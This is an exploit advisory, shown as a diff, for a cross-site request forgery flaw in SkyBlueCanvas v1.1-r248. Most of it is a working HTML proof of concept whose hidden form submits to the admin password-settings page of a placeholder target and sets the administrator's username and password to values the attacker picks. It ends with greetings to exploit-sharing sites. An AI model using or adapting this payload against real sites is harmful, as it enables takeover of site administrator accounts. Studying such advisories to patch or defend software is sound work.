@@ -1,0 +1,42 @@
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+1  [+]Exploit Title: Skybluecanvas.v1.1-r248 CSRF vulnirabilitie       0
+0  [+]Date: 022/09/2010                                                1
+1  [+]Author: Sweet                                                    0
+0  [+]Contact : charif38@hotmail.fr                                    0
+1  [+]Software Link: www.skybluecanvas.com                             0
+0  [+]Download: www.skybluecanvas.com/downloads.html                   1
+1  [+]Version:v1.1-r248                                                0
+0  [+]Tested on: Backtrack 4                                           1
+1  [+]Risk : Hight                                                     0
+0  [+]Description :                                                    0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+----=PoC=----
+<html>
+<body>
+<h3>Skybluecanvas.v1.1-r248 CSRF vulnirabilitie</h3>
+<form method="POST" name="form0" action="http://target.com/path/admin.php?mgroup=settings&mgr=password&objtype=password">
+<input type="hidden" name="id" value="1"/>
+<input type="hidden" name="username" value="admin"/>    <!-- User name     -->
+<input type="hidden" name="password" value="password"/> <!-- your password  -->
+<input type="hidden" name="confirm" value="password"/>  <!-- confirm password -->
+<p> Press Continue to update admin information <input type="submit" name="submit" value="Continue"/> </p>
+</form>
+<form method="GET" name="form1" action="http://target.com/path/admin.php?mgroup=settings&mgr=password&objtype=password">
+<input type="hidden" name="name" value="value"/> 
+</form>
+<form method="GET" name="form2" action="http://target.com/path/admin.php">
+<input type="hidden" name="name" value="value"/> 
+</form>
+<form method="GET" name="form3" action="http://target.com/path/admin.php?mgr=login&js=1">
+<input type="hidden" name="name" value="value"/> 
+</form>
+</body>
+</html>
+
+
+(thx to Milw0rm.com , JF - Hamst0r - Keystroke) R.I.P  , inj3ct0r.com , exploit-db.com, packetstormsecurity.org, http://ha.ckers.org
+
+
+et 1,2,3 viva L'Algerie :))
+
